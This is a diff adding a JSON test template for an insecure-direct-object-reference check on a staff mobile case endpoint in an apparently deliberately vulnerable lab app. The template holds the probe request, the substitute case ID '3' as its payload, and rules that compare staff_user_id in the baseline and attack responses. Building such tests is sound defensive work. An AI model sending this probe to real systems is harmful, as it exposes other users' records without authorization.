@@ -1,0 +1,23 @@
+{
+  "templateId": "wonchang-staff-idor-template",
+  "title": "원창대학교 교직원 모바일 상세 조회 IDOR",
+  "description": "staff 역할 세션으로 본인 업무 ID 1과 다른 담당자 업무 ID 3을 조회합니다. 응답의 staff_user_id가 4에서 5로 바뀌면 객체 인가 부재입니다.",
+  "sessionRole": "owner",
+  "fixtures": ["vul-web2-wonchang"],
+  "attackType": { "name": "broken_access_control", "cwe": "CWE-285" },
+  "dependency": { "runtime": "java", "framework": "spring-boot", "library": "sqlite-jdbc" },
+  "target": { "method": "GET", "endpoint": "/api/staff/mobile/cases/:id" },
+  "request": { "packet": { "method": "GET", "path": "/api/staff/mobile/cases/:id" } },
+  "blanks": {
+    "origin": { "required": true, "type": "url" },
+    "payload": { "required": true, "type": "string", "pickFrom": "payloads", "desc": "다른 담당자의 업무 ID입니다. 기준 요청은 ID 1입니다." }
+  },
+  "payloads": ["3"],
+  "verify": {
+    "mode": "ownershipComparison",
+    "baseline": { "path": "/api/staff/mobile/cases/1", "status": 200, "contains": "\"staff_user_id\":4" },
+    "attack": { "status": 200, "contains": "\"staff_user_id\":5" }
+  },
+  "executor": "guardrail",
+  "trust": "unverified"
+}
